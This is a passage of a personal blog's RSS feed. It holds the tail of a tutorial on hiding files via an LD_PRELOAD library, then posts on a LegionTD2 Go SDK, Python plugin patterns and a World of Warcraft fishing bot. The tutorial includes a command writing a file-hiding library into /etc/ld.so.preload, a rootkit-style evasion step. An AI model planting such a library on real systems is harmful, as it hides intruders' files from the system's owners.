&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ sudo echo &lt;span style="color:#e6db74">&amp;#34;/lib/libhidemyfile.so&amp;#34;&lt;/span> &amp;gt; /etc/ld.so.preload
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And if everything is good, executing &lt;code>ls&lt;/code> or any of its aliases will hide our file from the output. Let&amp;rsquo;s verify this by using &lt;code>ldd&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ ldd /bin/ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> linux-vdso.so.1 (0x00007ffc0c8e2000)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /lib/libhidemyfile.so (0x00007f00e59e4000) &amp;lt;--- Here it is!
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> libselinux.so.1 =&amp;gt; /lib64/libselinux.so.1 (0x00007f00e5997000)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> libcap.so.2 =&amp;gt; /lib64/libcap.so.2 (0x00007f00e598d000)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> libc.so.6 =&amp;gt; /lib64/libc.so.6 (0x00007f00e5600000)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> libpcre2-8.so.0 =&amp;gt; /lib64/libpcre2-8.so.0 (0x00007f00e58f0000)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /lib64/ld-linux-x86-64.so.2 (0x00007f00e5a0f000)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>For your convenience I&amp;rsquo;ve setup a Docker container that you can use with &lt;code>ld.so.preload&lt;/code> setup&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ docker run -it --rm sylly/ctf_findme
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="end" >End
&lt;span>
&lt;a href="#end">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>If you reached here, thank you so much for the read. In the next part I will try to &amp;ldquo;completely&amp;rdquo; hide it from the system because now if we &lt;code>cat&lt;/code> it despite not &amp;ldquo;reading&amp;rdquo; it in the directory would print us the contents of the file, but that will be the subject of the next post.&lt;/p>
&lt;p>&lt;a href="https://github.com/syrull/evasive_techniques/blob/main/Part_1_readdir/">Full Source Code&lt;/a>&lt;/p>
&lt;h1 id="resources" >Resources
&lt;span>
&lt;a href="#resources">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>This post wouldn&amp;rsquo;t be possible without:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf">https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://attack.mitre.org/techniques/T1574/006/">https://attack.mitre.org/techniques/T1574/006/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/">https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.jessfraz.com/post/ld_preload/">https://blog.jessfraz.com/post/ld_preload/&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>LegionTD2 Go SDK (v0.2.0)</title><link>https://sy1.sh/posts/legiontd2-sdk/</link><pubDate>Tue, 23 Aug 2022 21:44:47 +0300</pubDate><guid>https://sy1.sh/posts/legiontd2-sdk/</guid><description>&lt;p>&lt;img src="https://sy1.sh/legiontdsdk/header.png" alt="LegionTD2">&lt;/p>
&lt;p>Recently I&amp;rsquo;ve been fascinated with a game called &lt;a href="https://beta.legiontd2.com/">LegionTD2&lt;/a>, this is a newly created game that I&amp;rsquo;ve been playing
as a map ever since Warcraft 3, it is tactical multiplayer tower-defense(td). The game is based on predictions and timings, if you play your cards right (or in the context of the game: sends/workers/units) you will prevail over the enemy team. Read more about it &lt;a href="https://store.steampowered.com/app/469600/Legion_TD_2__Multiplayer_Tower_Defense/">here&lt;/a>.&lt;/p>
&lt;h1 id="legiontd-sdk" >LegionTD SDK
&lt;span>
&lt;a href="#legiontd-sdk">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>I&amp;rsquo;ve doing stuff in Go in my free time (mainly code challenges) for a while now and I&amp;rsquo;ve decided that I should spend some time creating something useful for myself such as creating tools that would help me get better at the game. The game has an API which resides &lt;a href="https://swagger.legiontd2.com/">here&lt;/a>, there are couple of endpoints that are useful for helpful statistics such as the &lt;code>player/*&lt;/code> and &lt;code>games/*&lt;/code> endpoints. I knew that I will be querying the API a lot for
fetching info about players and games, so I&amp;rsquo;ve decided to create an SDK for that so I can ease my work a little bit. And after couple of weeks free time work I&amp;rsquo;ve created the &lt;a href="https://github.com/syrull/ltdsdk">LegionTD 2 SDK for Go&lt;/a>.&lt;/p>
&lt;h1 id="functionality" >Functionality
&lt;span>
&lt;a href="#functionality">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;h2 id="analyze-games" >Analyze games
&lt;span>
&lt;a href="#analyze-games">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>While my ultimate goal is to create set of analytics tools for Legion, I&amp;rsquo;ve created the most basic example of how that might happen using SQLite3 and Go.&lt;/p>
&lt;p>Under the &lt;a href="https://github.com/syrull/ltdsdk/tree/main/examples/analyze_games">examples/analyze_games/&lt;/a> I&amp;rsquo;ve created an example that fetches about 3k games and put them into a SQLite database, after that you are able to analyze the data using SQL. I&amp;rsquo;ve created a simple query that gets the percentage of games
that are being finished at waves 15, 13 and 10.&lt;/p>
&lt;p>In my case here are the results, games finished at wave&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Wave 15&lt;/th>
&lt;th>Wave 13&lt;/th>
&lt;th>Wave 10&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>20%&lt;/td>
&lt;td>14%&lt;/td>
&lt;td>4%&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="exporting-the-games" >Exporting the games
&lt;span>
&lt;a href="#exporting-the-games">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>You can derive that from the previous example but I&amp;rsquo;ve created a dedicated examples for both exporting to JSON and exporting to SQL.&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/syrull/ltdsdk/tree/main/examples/export_games_to_sql">Export games to SQL&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/syrull/ltdsdk/blob/main/examples/export_games_to_json/main.go">Export games to JSON&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="fetching-all-of-the-units" >Fetching all of the Units
&lt;span>
&lt;a href="#fetching-all-of-the-units">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Since that the game hasn&amp;rsquo;t got a dedicated route for fetching all the units I&amp;rsquo;ve created a simple example that resides in the repository under &lt;a href="https://github.com/syrull/ltdsdk/tree/main/examples/get_all_units">examples/get_all_units&lt;/a>. The important thing here is that I&amp;rsquo;ve exported all the units into a single txt file and then I just spawn requests for each unit.&lt;/p>
&lt;h1 id="conclusion" >Conclusion
&lt;span>
&lt;a href="#conclusion">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>I will be updating the SDK as I am progressing with the analytical tools and I will be adding new examples and adding new posts as I am doing it. For now you can keep an eye on the &lt;a href="https://github.com/syrull/ltdsdk/">repository&lt;/a> and I will be definitely posting/discussing more about it in the &lt;a href="https://discord.gg/ttnSSqyV">Discord Channel&lt;/a>.&lt;/p></description></item><item><title>Create Plugin Architecture With Python</title><link>https://sy1.sh/posts/create-plugin-architecture-with-python/</link><pubDate>Mon, 23 May 2022 21:44:27 +0300</pubDate><guid>https://sy1.sh/posts/create-plugin-architecture-with-python/</guid><description>&lt;p>There are some use-cases where a plugin architecture is needed, I call this &amp;ldquo;code&amp;rdquo; plugins but it is quite possible that there is already a word for that. The idea is to &amp;rsquo;load&amp;rsquo; functions or classes that are dynamically created so that you can have the reference to the instances at runtime. I&amp;rsquo;ve created 2 solutions for that matter one that is using the &lt;code>__subclasses__&lt;/code> dunder method and one using a decorator.&lt;/p>
&lt;h1 id="solution-1" >Solution 1
&lt;span>
&lt;a href="#solution-1">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Repository: &lt;a href="https://github.com/syrull/plugin-arch-python/tree/main/Solution-1">https://github.com/syrull/plugin-arch-python/tree/main/Solution-1&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-tree" data-lang="tree">SOLUTION-1
│ configuration.py
│ main.py
│ README.md
│ setup.py
│
└───actions
action_example1.py
action_example2.py
__init__.py
&lt;/code>&lt;/pre>&lt;p>Loading the &lt;code>__subclasses__&lt;/code> of the &lt;code>BaseAction&lt;/code> class and creating a &amp;lsquo;pluggable&amp;rsquo; classes. The actions can be specified in the &lt;code>configuration.py&lt;/code> file in the &lt;code>ACTIONS&lt;/code> const. This method is inspired by django&amp;rsquo;s &lt;code>INSTALLED_APPS&lt;/code> method.&lt;/p>
&lt;p>The &lt;code>call&lt;/code> method is a placeholder for the &amp;ldquo;actions&amp;rdquo;.&lt;/p>
&lt;h2 id="to-register-an-action" >To Register an action
&lt;span>
&lt;a href="#to-register-an-action">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ul>
&lt;li>New python file in &lt;code>actions/&lt;/code> folder&lt;/li>
&lt;li>Create a class with an appropriate name (ex. &lt;code>ClickAction&lt;/code>)&lt;/li>
&lt;li>Extend the class with &lt;code>BaseAction&lt;/code>&lt;/li>
&lt;li>Add an entry to &lt;code>ACTIONS&lt;/code> const located in &lt;code>configuration.py&lt;/code> file with the approriate path to the module&lt;/li>
&lt;/ul>
&lt;p>After that the function will be available at the &lt;code>register&lt;/code> in the &lt;code>main.py&lt;/code> file.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ python main.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[&amp;lt;class &amp;#39;actions.action_example1.Example1Action&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;actions.action_example2.Example2Action&amp;#39;&amp;gt;]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="benchmarks" >Benchmarks
&lt;span>
&lt;a href="#benchmarks">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>Measure-Command { python .\main.py }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>Days : 0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Hours : 0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Minutes : 0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Seconds : 0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Milliseconds : 24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ticks : 240745
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TotalDays : 2.78640046296296E-07
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TotalHours : 6.68736111111111E-06
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TotalMinutes : 0.000401241666666667
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TotalSeconds : 0.0240745
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TotalMilliseconds : 24.0745
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="solution-2" >Solution 2
&lt;span>
&lt;a href="#solution-2">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Repository: &lt;a href="https://github.com/syrull/plugin-arch-python/tree/main/Solution-2">https://github.com/syrull/plugin-arch-python/tree/main/Solution-2&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-tree" data-lang="tree">SOLUTION-2
│ main.py
│ README.md
│ register.py
│
└───actions
action_example1.py
action_example2.py
__init__.py
&lt;/code>&lt;/pre>&lt;p>The benefits of this solution are that we have a control over the decorator and we can pass some custom &lt;code>*args, **kwargs&lt;/code> to the decorated functions.&lt;/p>
&lt;h2 id="to-register-an-action-1" >To Register an action
&lt;span>
&lt;a href="#to-register-an-action-1">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ul>
&lt;li>New python file in &lt;code>actions/&lt;/code> folder&lt;/li>
&lt;li>Create function with an appropriate name (ex. &lt;code>action_onclick&lt;/code>)&lt;/li>
&lt;li>Decorate the function with &lt;code>register_action&lt;/code> decorator&lt;/li>
&lt;li>Export the function in the &lt;code>__all__&lt;/code> method in &lt;code>actions/__init__.py&lt;/code> file&lt;/li>
&lt;/ul>
&lt;p>After that the function will be available at the &lt;code>register&lt;/code> in the &lt;code>main.py&lt;/code> file.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ python main.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[&amp;lt;function action_example1 at 0x000001CC3F88D310&amp;gt;, &amp;lt;function action_example2 at 0x000001CC3F88D3A0&amp;gt;]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="benchmarks-1" >Benchmarks
&lt;span>
&lt;a href="#benchmarks-1">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>Measure-Command { python .\main.py }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>Days : 0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Hours : 0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Minutes : 0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Seconds : 0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Milliseconds : 22
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ticks : 227803
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TotalDays : 2.6366087962963E-07
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TotalHours : 6.32786111111111E-06
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TotalMinutes : 0.000379671666666667
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TotalSeconds : 0.0227803
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TotalMilliseconds : 22.7803
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Simple Fishing Bot for World of Warcraft</title><link>https://sy1.sh/posts/simple-fishing-bot/</link><pubDate>Sun, 22 May 2022 21:37:03 +0300</pubDate><guid>https://sy1.sh/posts/simple-fishing-bot/</guid><description>&lt;p>This fishing bot consists only of about 50 lines of code, it incorporates the mechanics of World of Warcraft and some simple Windows API Calls.&lt;/p>
&lt;p>&lt;img src="https://sy1.sh/fishing-bot/fishing.gif" alt="Fishing Bot in action">&lt;/p>
&lt;p>Repository: &lt;a href="https://github.com/syrull/simple-fishing-bot">https://github.com/syrull/simple-fishing-bot&lt;/a>&lt;/p>
&lt;h2 id="overview" >Overview
&lt;span>
&lt;a href="#overview">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>The bot has about ~99% success rate, there are some extremely rare cases where the bot won&amp;rsquo;t catch it and I will explain why later. The method that the bot is using, should
work in almost any fishing scenario in the game, I would personally avoid crowded places. The testing has been done in the current expansion (Shadowlands).&lt;/p>
&lt;p>The bot is running on the currently Active Window, I haven&amp;rsquo;t performed checks wether this is the window of the game or not. It waits for about 2 seconds before it starts.&lt;/p>
&lt;h3 id="metrics" >Metrics
&lt;span>
&lt;a href="#metrics">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h3>&lt;pre tabindex="0">&lt;code>Zereth Mortis: 29m 33s
Items Looted: 161
&lt;/code>&lt;/pre>&lt;p>That means that we loot roughly about ~5.4 fish per minute.&lt;/p>
&lt;h2 id="installation--usage" >Installation &amp;amp; Usage
&lt;span>
&lt;a href="#installation--usage">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Check the &lt;code>requirements.txt&lt;/code>, for the Python Requirements and install them via &lt;code>pip install -r requirements.txt&lt;/code>. The tests are done under Python3.10 however I believe everything should work with Python&amp;gt;=3.6.&lt;/p>
&lt;h3 id="set-the-bait" >Set the bait
&lt;span>
&lt;a href="#set-the-bait">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h3>&lt;p>Before using the bot, you need to supply it with an image of the bait. The image has to be on the bottom parts of the bait. Here is an example image, the green area indicates what would be a good image of the bait, it needs to be as small as possible.&lt;/p>
&lt;p>&lt;img src="https://sy1.sh/fishing-bot/bait_example.png" alt="Bait Example">&lt;/p>
&lt;p>Save the image and place it at the root of the script as &lt;code>bait.png&lt;/code>, additionally you can adjust the variable &lt;code>BAIT_IMAGE&lt;/code> in the `fishingbot.py.&lt;/p>
&lt;blockquote>
&lt;p>⚠️ It is important for you to take the photo because of the graphical/display settings which can be different for each computer.&lt;/p>
&lt;/blockquote>
&lt;h3 id="fine-tune-the-script" >Fine-tune the script
&lt;span>
&lt;a href="#fine-tune-the-script">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h3>&lt;p>The fine tunning that you have to do consists of:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>FISHING_BUTTON &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;b&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TUNE_BAIT_MOUSE_UNDER_PX &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">35&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>EDGE_RESET &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>, &lt;span style="color:#ae81ff">10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ACTIVE_AFTER &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
